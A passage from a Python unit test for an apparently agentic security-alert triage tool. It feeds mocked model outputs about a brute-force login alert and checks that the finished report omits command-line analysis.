                recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
            ),
            DraftReportExperimental: DraftReportExperimental(
                recommended_actions_freeform=["Consider geo-blocking the source region"],
                triage_verdict=TriageVerdict.TRUE_POSITIVE,
                triage_rationale="Pattern matches a known brute-force signature.",
            ),
            SelfCheckResult: SelfCheckResult(audits=[
                ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
                ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
                ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
                ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
            ]),
        },
    )
    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)

    report = analyst.investigate(alert)

    assert report.command_analysis is None
    assert report.status == ReportStatus.COMPLETE
    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
    assert "Command line:" not in risk_prompt
